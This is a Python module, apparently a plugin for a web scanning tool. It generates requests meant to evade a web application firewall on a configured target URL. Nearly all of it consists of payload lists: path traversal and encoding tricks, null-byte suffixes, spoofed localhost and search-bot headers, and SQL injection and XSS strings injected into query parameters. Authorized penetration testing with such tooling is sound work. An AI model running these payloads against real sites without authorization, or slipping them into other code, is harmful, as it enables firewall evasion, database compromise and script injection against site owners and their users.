#!/usr/bin/env python3
"""
WAF-specific bypass techniques
"""

import urllib.parse
import base64
import random
import string

class WAFBypass:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate WAF bypass tests"""
        tests = []
        base_url = self.manager.target_url
        parsed = urllib.parse.urlparse(base_url)
        path = parsed.path if parsed.path else '/'
        
        # WAF evasion payloads
        waf_payloads = [
            # Path obfuscation
            path + '/..;/',
            path + '/..;/..;/',
            path + '/.;/',
            path + '/./',
            path + '/../',
            path + '/..%2f',
            path + '/%2e%2e%2f',
            path + '/%252e%252e%252f',
            path + '/%c0%ae%c0%ae%c0%af',
            path + '/%c0%ae%c0%ae/',
            path + '/%e0%40%ae%xe0%40%ae%xe0%40%af',
            path + '/%2e%2e%5c',
            path + '/..%5c',
            path + '/%2e%2e%5c%2e%2e%5c',
            
            # Case manipulation
            path.upper(),
            path.lower(),
            path.swapcase(),
            path.title(),
            '//' + path,
            '///' + path,
            '////' + path,
            path + '/',
            path + '//',
            path + '///',
            
            # Comment injection
            path + '/*',
            path + '/**/',
            path + '*/',
            path + '/*/',
            path + '/***/',
            path + '/%2f*%2f',
            path + '/%2a%2f',
            
            # URL encoding variants
            urllib.parse.quote(path, safe=''),
            urllib.parse.quote(path, safe='/'),
            urllib.parse.quote(path, safe=' /'),
            path.replace('/', '%2f'),
            path.replace('/', '%252f'),
            path.replace('/', '%2F'),
            path.replace('/', '%252F'),
            path.replace('/', '%2f%2f'),
            path.replace('/', '%2f%252f'),
            path.replace('/', '%252f%252f'),
            
            # Double encoding
            urllib.parse.quote(urllib.parse.quote(path, safe='')),
            urllib.parse.quote(urllib.parse.quote(path, safe='/')),
            
            # Unicode encoding
            path.replace('/', '\\u002f'),
            path.replace('/', '\\u2215'),
            path.replace('/', '\\u2044'),
            path.replace('/', '\\uFF0F'),
            path.replace('/', '\\uEFC8'),
            
            # Null byte injection
            path + '%00',
            path + '?%00',
            path + '%00?',
            path + '%00.html',
            path + '.%00',
            path + '%00.htaccess',
            path + '?%00=test',
            path + '%00?test=1',
        ]
        
        # WAF bypass headers
        waf_headers = [
            {'User-Agent': ''},
            {'User-Agent': 'Mozilla/5.0'},
            {'User-Agent': 'Googlebot'},
            {'User-Agent': 'Bingbot'},
            {'User-Agent': 'curl/7.68.0'},
            {'User-Agent': 'wget'},
            {'User-Agent': 'python-requests'},
            {'User-Agent': 'python-urllib'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'},
            
            # Content-Type evasion
            {'Content-Type': 'application/x-www-form-urlencoded'},
            {'Content-Type': 'multipart/form-data'},
            {'Content-Type': 'text/plain'},
            {'Content-Type': 'text/html'},
            {'Content-Type': 'application/json'},
            {'Content-Type': 'application/xml'},
            
            # Accept header evasion
            {'Accept': '*/*'},
            {'Accept': 'text/html'},
            {'Accept': 'application/json'},
            {'Accept': 'text/plain'},
            {'Accept': 'text/xml'},
            
            # Accept-Language evasion
            {'Accept-Language': 'en-US'},
            {'Accept-Language': 'en'},
            {'Accept-Language': 'zh-CN'},
            {'Accept-Language': 'ja'},
            {'Accept-Language': 'fr'},
            {'Accept-Language': 'de'},
            {'Accept-Language': 'ru'},
            
            # Accept-Encoding evasion
            {'Accept-Encoding': 'gzip, deflate'},
            {'Accept-Encoding': 'identity'},
            {'Accept-Encoding': '*'},
            
            # Connection header
            {'Connection': 'close'},
            {'Connection': 'keep-alive'},
            {'Connection': 'upgrade'},
            
            # X-Forwarded-For evasion
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1, 127.0.0.2'},
            {'X-Forwarded-For': '127.0.0.1, 10.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1, 192.168.1.1'},
            {'X-Forwarded-For': '127.0.0.1, 172.16.0.1'},
            {'X-Forwarded-For': '::1'},
            
            # Other evasion headers
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
        ]
        
        # Test WAF payloads
        for payload in waf_payloads:
            if payload != path:
                new_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    payload,
                    parsed.params,
                    parsed.query,
                    parsed.fragment
                ))
                tests.append({
                    'name': f'WAF Bypass: {payload[:30]}...',
                    'url': new_url,
                    'headers': {},
                    'method': 'GET'
                })
        
        # Test WAF headers
        for headers in waf_headers:
            tests.append({
                'name': f'WAF Header: {list(headers.keys())[0]}={list(headers.values())[0]}',
                'url': base_url,
                'headers': headers,
                'method': 'GET'
            })
        
        # Test with SQL injection bypass patterns
        sql_patterns = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1--",
            "' AND 1=1--",
            "' AND '1'='1'--",
            "' OR 'x'='x",
            "' OR 1=1#",
            "' OR 1=1/*",
            "1' OR '1'='1",
            "1' AND '1'='1",
            "1' AND 1=1--",
        ]
        
        for pattern in sql_patterns:
            url = base_url + '?id=' + urllib.parse.quote(pattern)
            tests.append({
                'name': f'SQL Bypass: {pattern[:20]}...',
                'url': url,
                'headers': {},
                'method': 'GET'
            })
        
        # Test with XSS bypass patterns
        xss_patterns = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            'javascript:alert(1)',
            'onerror=alert(1)',
            'onload=alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><svg/onload=alert(1)>',
        ]
        
        for pattern in xss_patterns:
            url = base_url + '?q=' + urllib.parse.quote(pattern)
            tests.append({
                'name': f'XSS Bypass: {pattern[:20]}...',
                'url': url,
                'headers': {},
                'method': 'GET'
            })
        
        return tests
